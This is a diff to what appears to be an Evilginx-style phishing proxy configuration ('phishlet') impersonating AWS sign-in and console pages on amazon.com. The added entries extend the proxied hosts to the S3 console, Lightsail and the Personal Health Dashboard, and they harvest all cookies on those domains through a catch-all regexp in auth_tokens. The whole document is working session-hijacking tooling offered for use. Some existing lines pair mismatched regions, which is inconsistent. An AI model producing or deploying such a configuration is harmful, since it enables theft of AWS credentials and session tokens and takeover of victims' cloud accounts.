@@ -48,6 +48,9 @@ proxy_hosts:
   - {phish_sub: 'us-west-1.signin.aws', orig_sub: 'us-east-1.signin.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'us-west-2.signin.aws', orig_sub: 'us-west-2.signin.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'us-west-2.console.aws', orig_sub: 'us-east-2.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 's3.console.aws', orig_sub: 's3.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'lightsail.aws', orig_sub: 'lightsail.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'phd.aws', orig_sub: 'phd.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
   - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
@@ -77,6 +80,9 @@ sub_filters:
   - {triggers_on: 'us-west-1.signin.aws', orig_sub: 'us-west-1.signin.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'us-west-2.signin.aws', orig_sub: 'us-west-2.signin.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'us-west-2.console.aws', orig_sub: 'us-west-1.console.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 's3.console.aws', orig_sub: 's3.console.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'lightsail.aws', orig_sub: 'lightsail.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'phd.aws', orig_sub: 'phd.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
 
 auth_tokens:
   - domain: '.amazon.com'
@@ -108,6 +114,12 @@ auth_tokens:
   - domain: 'us-west-1.console.aws.amazon.com'
     keys: ['.*,regexp']
   - domain: 'us-west-2.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 's3.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 'lightsail.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 'phd.aws.amazon.com'
     keys: ['.*,regexp']
 
 auth_urls:
